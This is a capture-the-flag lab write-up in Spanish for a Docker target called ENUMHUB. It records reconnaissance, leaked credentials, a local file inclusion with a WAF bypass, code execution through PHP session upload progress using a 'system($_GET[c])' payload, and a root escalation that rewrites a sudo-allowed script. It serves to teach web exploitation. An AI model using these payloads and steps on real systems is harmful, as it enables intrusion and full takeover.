# ENUMHUB — Bitácora del análisis

**Objetivo:** `172.17.0.2` (contenedor Docker) — **Atacante:** Kali (`172.17.0.1`)
**Dificultad:** difícil (★★★★★☆☆☆, 5 pts) — **Bandera:** `/root/flag.txt`
**Fecha:** 15/10/2026

---

## 1. Fase de reconocimiento

### 1.1 Enumeración de puertos

`startlab.sh` solo publica el puerto 80, pero lo confirmo con un escaneo completo:

```
$ nmap -Pn -p- --min-rate 4000 172.17.0.2
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
```

**Lectura clave:** el laboratorio es exclusivamente web. No habrá SSH ni FTP, así que
todo el ataque debe surgir de la capa HTTP. Esto descarta de entrada la fuerza bruta de
servicios, que fue el vector principal en el laboratorio ROMA.

### 1.2 Superficie web

El `index.html` es estático (412 B) y no enlaza a nada útil. `robots.txt`, en cambio, regala
cuatro rutas:

```
Disallow: /admin
Disallow: /backup
Disallow: /dev
Disallow: /.git
Disallow: /old-site
```

Estado inicial de cada una:

| Ruta | Contenido |
|---|---|
| `/admin/` | Directorio vacío |
| `/backup/` | `config.php.bak`, `log.txt`, `notes.txt` |
| `/dev/` | `credentials.txt`, `test.php` (phpinfo) |
| `/.git/` | Solo `config` (el resto da 404) |
| `/old-site/` | Página «Legacy Portal» |

---

## 2. Fugas de información

### 2.1 Repositorio Git publicado

`/.git/config` es el primer hallazgo serio:

```
[remote "origin"]
    url = https://developer:DevToken2024!@github.com/enumhub/webapp.git
```

Verifiqué que el resto del repositorio no es accesible (`.git/HEAD`, `.git/objects/`,
`.git/refs/` devuelven 404), así que **no es explotable para recuperar el código fuente**, pero
la credencial y el nombre del repositorio quedan expuestos.

### 2.2 El autor se delata a sí mismo

`/backup/notes.txt` es el hallazgo que condiciona toda la estrategia:

```
TODO LIST:
- Fix filemanager.php LFI vulnerability
- Clean up .git directory from production

IMPORTANT:
Flag is located at /root/flag.txt (Only Root can read it)
```

> **Decisión:** a partir de aquí el reto deja de ser «encontrar» y pasa a ser «encadenar».
> Esto reduce mucho el riesgo de perder tiempo explorando a ciegas.

`/backup/config.php.bak` añade credenciales de producción (DB, `API_KEY`, `JWT_SECRET`) y
confirma `ADMIN_PANEL = /old-site/admin/`, que es donde vive `filemanager.php`.

---

## 3. La LFI y el WAF

### 3.1 Lectura del código fuente

Sin acceso al código, uso la propia LFI con `php://filter` para leer el fichero como texto.
El WAF bloquea la cadena `base64`, pero `convert.iconv` no está filtrado:

```
file=php://filter/convert.iconv.UTF8.UTF16/resource=/var/www/html/old-site/admin/filemanager.php
```

Código obtenido:

```php
$file = $_GET["file"];
// SECURITY BLOCK: Force Log Poisoning
if (strpos($file, "flag") !== false || strpos($file, "base64") !== false) {
    die("🚫 Security Alert: ... blocked by WAF!");
}
if (isset($file)) {
    echo "File Contents:";
    include($file);      // LFI
}
```

**Lectura crítica del comentario:** `// Force Log Poisoning`. El autor *quiere* que se use log
poisoning. Esto orienta la fase siguiente, pero como se comprobará, la vía no es viable.

### 3.2 Confirmación de la LFI y prueba del WAF

```
?file=/etc/passwd     → lee el fichero (LFI confirmada, uid 33 www-data)
?file=/root/flag.txt  → 🚫 Security Alert: ... blocked by WAF!
```

El WAF comprueba subcadenas sobre el valor bruto, sin normalizar la ruta. Podría eludirse con
`/proc/self/root/root/fl../ag.txt` o similar, **pero sería inútil**: `/root/` requiere permisos
de root que `www-data` no tiene. El bloqueo es correcto en su intención.

---

## 4. De LFI a RCE — seis vías descartadas y una ganadora

### 4.1 Datos del phpinfo que condicionan todo

Extraídos de `/dev/test.php`:

| Directiva | Valor | Lectura |
|---|---|---|
| `allow_url_include` | **Off** | Anula `data://`, `expect://`, `php://input` |
| `disable_functions` | solo `pcntl_*` | `system()` libre |
| `session.upload_progress.enabled` | **On** | ← La clave |
| `session.save_path` | `/var/lib/php/sessions` | Ruta conocida y legible |
| `open_basedir` | *(sin valor)* | Sin restricciones |
| `session.upload_progress.cleanup` | On | Obliga a ganar una carrera |

### 4.2 Caminos descartados (y por qué)

El comentario del WAF empujaba al log poisoning. Lo probé y **ninguna variante funciona**:

| Vía | Intento | Resultado |
|---|---|---|
| `php://input` | POST con código PHP | Vacío: `enable_post_data_reading=On` |
| `data://text/plain,...` | Wrapper en claro | Vacío: `allow_url_include=Off` |
| Log de PHP (`error.log`) | Inyección vía `?file=` | PHP escapa `<`/`>` → `&lt;`/`&gt;` |
| URI en `error.log` | `GET /<?php system($_GET[c]); ?>` | El `?` corta la ruta |
| URI codificada | `%3C%3Fphp...%3E.php` | Apache decodifica antes de dividir → registra `x.php` |
| `User-Agent` / cabeceras | cabecera con código PHP | No se registran en `error.log` |

> **Aprendizaje:** el `?` de la etiqueta `<?php` es estructuralmente incompatible con la URI.
> No hay forma de inyectar PHP en una URL, ni siquiera codificándolo, porque Apache decodifica
> los percent-encoding **antes** de separar la cadena de consulta. Por eso el log poisoning que
> sugiere el WAF es una pista falsa: el autor probablemente nunca lo probó.

### 4.3 El camino ganador: session upload progress

El mecanismo de *upload progress* escribe en el fichero de sesión un registro cuyo **nombre es
el valor del campo `PHP_SESSION_UPLOAD_PROGRESS`**:

```
upload_progress_<?php system($_GET["c"]); ?>|a:5:{...}
```

Al incluir ese fichero, el prefijo se imprime como texto y el bloque `<?php ?>` se ejecuta.

### 4.4 Obstáculos técnicos durante la implementación

Cuatro errores que costaron tiempo, documentados para no repetirlos:

| Problema | Causa raíz | Solución |
|---|---|---|
| `curl -F` no enviaba la carga | En la sintaxis `-F`, un `<` inicial significa «leer de fichero» | Construir el multipart a mano |
| La sesión desaparecía al instante | `urllib` con `data=` manda el cuerpo entero de golpe | Socket crudo + `Transfer-Encoding: chunked` |
| El multipart se descartaba | Faltaba el prefijo `--` en la línea separadora del boundary | Multipart bien formado |
| Salida vacía intermitente | Carrera: la sesión se limpia al terminar la subida | Fichero grande (25 MB) + bucle de reintentos |

**Resultado:**

```
$ python3 exploits/rce.py 'id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
```

RCE como `www-data`.

---

## 5. Escalada a root

### 5.1 Superficie de privilegios

Con RCE, lo primero es ver qué puede hacer `www-data`:

```
$ sudo -n -l
User www-data may run the following commands on enumhub:
    (root) NOPASSWD: /usr/local/bin/backup-system.sh
```

No hay crontab, ni binarios SUID relevantes, ni socket de Docker. Pero hay una regla `sudo` sin contraseña.

### 5.2 El detonante

```
-rwxr-xr-x 1 www-data www-data 60 Feb  7  2026 /usr/local/bin/backup-system.sh
```

El script **pertenece a `www-data`**. Quien puede escribir el fichero que `sudo` ejecuta como
root, ya es root. No hay ninguna explotación adicional: basta reescribirlo.

```bash
printf '#!/bin/bash\ncat /root/flag.txt\nid\n' > /usr/local/bin/backup-system.sh
sudo /usr/local/bin/backup-system.sh
```

```
ENUMHUB{RCE_v1a_L0g_P01s0n1ng_2_R00T_M4st3r}
uid=0(root) gid=0(root) groups=0(root)
```

---

## 6. Progreso

- [x] Reconocimiento completo (solo `:80`)
- [x] Rutas reveladas por `robots.txt`
- [x] Credenciales filtradas: `.git/config`, `config.php.bak`, `credentials.txt`
- [x] Código fuente del fichero vulnerable obtenido vía `php://filter`
- [x] LFI confirmada y WAF evaluado
- [x] Seis vías de RCE descartadas con su motivo
- [x] RCE como `www-data` vía session upload progress
- [x] Superficie `sudo` inventariada
- [x] Escalada a root (script privilegiado propiedad de `www-data`)
- [x] Lectura de `/root/flag.txt` y validación por el laboratorio

```
ENUMHUB{RCE_v1a_L0g_P01s0n1ng_2_R00T_M4st3r}
```

---

## 7. Ideas descartadas sobre la marcha

| Hipótesis | Por qué se descartó |
|---|---|
| Usar las credenciales de la BD para un `mysqldump` o un UDF | El puerto 3306 no está expuesto y no hay binario `mysql` accesible |
| Entrar por FTP con `devuser` | El servicio no está publicado en el laboratorio |
| Forzar `admin@enumhub.local` como login web | `/old-site/admin/login.php` solo muestra un aviso; no hay formulario |
| Bypass del WAF con `/proc/self/root/...` | Aunque se evite el filtro, `/root/` sigue inaccesible para `www-data` |
| `JWT_SECRET` para falsificar un token de API | No existe ningún endpoint de API; el secreto es un señuelo |
| Explotar el kernel (contenedor `--privileged`) | Excesivamente complejo y lento frente a un `sudo` directo ya disponible |
